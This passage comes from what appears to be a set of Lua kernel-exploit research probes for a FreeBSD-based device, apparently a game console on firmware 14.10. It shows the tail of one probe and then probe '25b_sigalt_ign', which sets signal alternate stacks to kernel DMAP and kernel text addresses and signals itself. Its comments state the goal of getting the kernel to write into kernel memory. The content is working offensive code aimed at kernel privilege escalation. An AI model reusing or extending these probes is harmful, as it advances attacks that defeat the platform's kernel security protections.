    (u_ok and "rv=" .. u_ret:tonumber() or "CRASH"))

-- Disable
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Restore defaults
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

log("")
log("=== SIGALT SAFE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase3_signals_codexec/25b_sigalt_ign.lua

```lua
-- 14.10 Recon Probe 25b: Kernel altstack with SIG_IGN ONLY
-- Probe 25 crashed because signal delivered despite sigprocmask block
-- New strategy: ONLY use SIG_IGN, never a real handler
-- SIG_IGN should never build a signal frame or touch the altstack
-- If SIG_IGN is truly safe, we can test kernel altstack without risk

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGALT IGN ONLY ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_sigpending = 343,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local SS_SIZE = 32
local SA_ONSTACK = 0x0001
local SA_SIGINFO = 0x0040
local SS_DISABLE = 4
local STACK_SZ = 16384

local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(SS_SIZE)
local ss_old = memory.alloc(SS_SIZE)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: SIG_IGN baseline on user altstack
-- ============================================================
log("")
log("--- PART 1: SIG_IGN + user altstack ---")

local user_stack = memory.alloc(STACK_SZ)
for i = 0, STACK_SZ - 4, 4 do
    memory.write_dword(user_stack + i, 0x11110000 + i)
end

-- Set altstack to user buffer
memory.write_qword(ss_new, user_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
local ss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set user altstack: " .. tostring(ss_ok))

-- Set SIGUSR1 to SIG_IGN with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN = 1
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set SIGUSR1 = IGN + ONSTACK")

-- Verify handler
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_old + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
local h_lo = memory.read_dword(sa_old):tonumber()
local h_hi = memory.read_dword(sa_old + 4):tonumber()
local h_fl = memory.read_dword(sa_old + 8):tonumber()
log(string.format("  verify: handler=0x%08x%08x flags=0x%x", h_hi, h_lo, h_fl))

-- Send SIGUSR1 to self
local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1): " .. (k_ok and "rv=" .. k_ret:tonumber() or "ERR"))

-- Check if altstack was modified
local modified = 0
local first_mod = -1
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(user_stack + i):tonumber()
    if v ~= 0x11110000 + i then
        modified = modified + 1
        if first_mod < 0 then first_mod = i end
    end
end
log("  user altstack modified dwords: " .. modified)
if first_mod >= 0 then
    log("  first mod at offset: " .. first_mod)
end

local alive = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive))

-- ============================================================
-- PART 2: SIG_IGN + kernel DMAP altstack
-- ============================================================
log("")
log("--- PART 2: SIG_IGN + kernel DMAP altstack ---")

-- Disable current altstack first
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Set altstack to kernel DMAP
memory.write_dword(ss_new, 0x10000000)      -- lo
memory.write_dword(ss_new + 4, 0xFFFFF800)  -- hi = DMAP
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel altstack: " .. tostring(kss_ok))

-- Verify it was set
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
local v_lo = memory.read_dword(ss_old):tonumber()
local v_hi = memory.read_dword(ss_old + 4):tonumber()
local v_fl = memory.read_dword(ss_old + 16):tonumber()
log(string.format("  verify: sp=0x%08x%08x flags=0x%x", v_hi, v_lo, v_fl))

-- SIGUSR1 already SIG_IGN + SA_ONSTACK from Part 1
-- Send it
local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) with kernel altstack: " ..
    (k2_ok and "rv=" .. k2_ret:tonumber() or "ERR"))

local alive2 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive2))

-- ============================================================
-- PART 3: SIG_IGN + kernel TEXT altstack
-- ============================================================
log("")
log("--- PART 3: SIG_IGN + kernel TEXT altstack ---")

memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

memory.write_dword(ss_new, 0x80200000)      -- lo = kernel text
memory.write_dword(ss_new + 4, 0xFFFFFFFF)  -- hi
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kt_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel text altstack: " .. tostring(kt_ok))

local k3_ok, k3_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) with ktext altstack: " ..
    (k3_ok and "rv=" .. k3_ret:tonumber() or "ERR"))

local alive3 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive3))

-- ============================================================
-- PART 4: SIG_DFL + kernel altstack (SIGUSR2)
-- SIG_DFL for SIGUSR2 = terminate process
-- If the signal is delivered, process dies (we lose connection)
-- If kernel detects bad altstack in sendsig, it may:
--   a) kill the process (SIGKILL) — we lose connection
--   b) fall back to normal stack — we survive
--   c) write to kernel memory — exploit!
-- ============================================================
log("")
log("--- PART 4: SIG_DFL + kernel altstack (SIGUSR2) ---")
log("  WARNING: this may kill the process")

-- Set kernel altstack (DMAP)
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

memory.write_dword(ss_new, 0x10000000)
memory.write_dword(ss_new + 4, 0xFFFFF800)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- SIGUSR2 = signal 31, default action = terminate
-- Set to SIG_DFL with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 0)  -- SIG_DFL = 0
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Send SIGUSR2 — if SIG_DFL=terminate, kernel builds no frame
-- It just calls sigexit() which doesn't need the altstack
local k4_ok, k4_ret = pcall(function() return syscall.sc_kill(pid, 31) end)
log("  kill(SIGUSR2,DFL): " ..
    (k4_ok and "rv=" .. k4_ret:tonumber() or "ERR"))

-- If we're still here, SIG_DFL terminate didn't work
local alive4 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive4))

-- ============================================================
-- PART 5: Test sigprocmask — does blocking actually work?
-- ============================================================
log("")
log("--- PART 5: sigprocmask test ---")

-- Disable altstack, restore handlers
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Test: block ALL signals, read old mask
local mask = memory.alloc(16)
local old_mask = memory.alloc(16)
memory.write_qword(mask, 0xFFFFFFFF)
memory.write_qword(mask + 8, 0xFFFFFFFF)

local pm_ok, pm_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK=1
end)
log("  sigprocmask(BLOCK,all): " ..
    (pm_ok and "rv=" .. pm_ret:tonumber() or "ERR"))

local om_lo = memory.read_dword(old_mask):tonumber()
local om_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  old mask: 0x%08x%08x", om_hi, om_lo))

-- Read current mask with SIG_SETMASK=3 and NULL new
-- Actually can't pass NULL... read via sigpending
local pend = memory.alloc(16)
local sp_ok, sp_ret = pcall(function()
    return syscall.sc_sigpending(pend)
end)
if sp_ok then
    local p_lo = memory.read_dword(pend):tonumber()
    log(string.format("  pending: 0x%08x", p_lo))
end

-- Unblock all
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end) -- SIG_SETMASK=3
local bm_lo = memory.read_dword(old_mask):tonumber()
local bm_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  blocked mask was: 0x%08x%08x", bm_hi, bm_lo))

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

log("")
log("=== SIGALT IGN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```
